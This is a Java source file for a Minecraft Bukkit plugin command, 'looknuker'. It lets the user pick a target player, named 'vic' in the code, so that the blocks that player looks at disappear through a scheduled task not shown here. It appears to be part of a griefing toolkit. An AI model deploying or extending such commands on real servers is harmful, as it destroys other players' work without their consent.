package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.ArrayList;

public class Command_LookNuker2 extends CommandBase {

    private final ArrayList<Player> players = new ArrayList<>();

    public Command_LookNuker2() {
        super("looknuker", "<Spieler>" + " §d| " + ChatColor.GRAY + "Gesehene Blöcke verschwinden", Category.WORLD);
        Bukkit.getScheduler().runTaskTimer(Start.INSTANCE, new Command_LookNuker(this, null), 4L, 4L);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            try {
                Player vic = Bukkit.getPlayer(args[1]);
                if (!this.players.contains(vic)) {
                    this.players.add(vic);
                    p.sendMessage(Start.INSTANCE.chatPrefix + "Beim Spieler verschwinden jetzt die Blöcke!");
                } else {
                    this.players.remove(vic);
                    p.sendMessage(Start.INSTANCE.chatPrefix + "Beim Spieler verschwinden die Blöcke nicht mehr.");
                }
            } catch (Exception ignored) {
            }
        }
    }

    static ArrayList<Player> getPlayersFromInstance(Command_LookNuker2 var0) {
        return var0.players;
    }

}
